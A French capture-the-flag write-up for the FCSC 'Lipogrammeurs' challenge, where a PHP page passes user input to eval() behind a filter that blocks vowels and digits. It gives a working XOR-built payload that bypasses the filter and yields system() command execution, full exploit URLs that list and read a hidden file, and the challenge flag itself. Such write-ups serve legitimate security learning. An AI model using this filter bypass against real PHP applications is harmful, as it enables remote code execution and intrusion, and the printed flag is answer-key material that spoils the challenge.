# Lipogrammeurs - 100 pts


# Énoncé 
>Vous avez trouvé cette page qui vous semble étrange. Pouvez-vous nous convaincre qu'il y a effectivement un problème en retrouvant le flag présent sur le serveur ?
>
>URL : http://challenges2.france-cybersecurity-challenge.fr:5008/
>
>Format du flag : FCSC{xxxx}
>

## Introduction

Ce challenge porte sur l'exploitation de la fonction eval de PHP, en contournant les filtres.


## Résolution

En arrivant sur la page, nous voyons uniquement ce morceau de code :

```
<?php
    if (isset($_GET['code'])) {
        $code = substr($_GET['code'], 0, 250);
        if (preg_match('/a|e|i|o|u|y|[0-9]/i', $code)) {
            die('No way! Go away!');
        } else {
            try {
                eval($code);
            } catch (ParseError $e) {
                die('No way! Go away!');
            }
        }
    } else {
        show_source(__FILE__);
    }
?>
```

On comprend qu'on peut injecter du code via ?code= dans l'URL. Celui-ci va être exécuté par PHP grâce à la fonction eval().

Cependant, nous voyons un problème, la commande __preg_match('/a|e|i|o|u|y|[0-9]/i')__ qui vérifie la présence de n'importe quelle voyelle ou de n'importe quel chiffre dans le code, et si c'est le cas, ne l'exécute pas. 

En recherchant comment contourner ce filtre, on trouve assez vite qu'on peut utiliser des XOR entre des caractères spéciaux, afin de générer du texte.

Après avoir réalisé plusieurs essais, nous avons trouvé ce payload 

```
"";$_='$<>/'^'{{{{';${$_}[_](${$_}[__]);
```

Analysons le :

```
$_='$<>/'^'{{{{' // l'opération XOR entre ces 2 chaines donne _GET

// $_ étant égal à _GET, on construit notre requête à partir de ça
// Le payload utilisé correspond donc à :

$_GET[_]($_GET[__])
```

De cette manière, une fois que la fonction eval aura exécuté notre payload, on peut envoyer de la data en get sur **_=** et sur **__=**
Cette requête :

```
http://challenges2.france-cybersecurity-challenge.fr:5008/?code="";$_='$<>/'^'{{{{';${$_}[_](${$_}[__]);&_=system&__=ls -a
```
nous exécute donc **$_GET[_]($_GET[__])** soit __system(ls -a)__.

La page nous retourne alors :

```
. .. .flag.inside.J44kYHYL3asgsU7R9zHWZXbRWK7JjF7E.php index.php
```

Il suffit de passer en paramètre un cat pour lire le contenu du fichier, on retrouve le flag dans le code source de la page.

```
http://challenges2.france-cybersecurity-challenge.fr:5008/?code="";$_='$<>/'^'{{{{';${$_}[_](${$_}[__]);&_=system&__=cat .flag.inside.J44kYHYL3asgsU7R9zHWZXbRWK7JjF7E.php
```


**FLAG :  _FCSC{53d195522a15aa0ce67954dc1de7c5063174a721ee5aa924a4b9b15ba1ab6948}_**
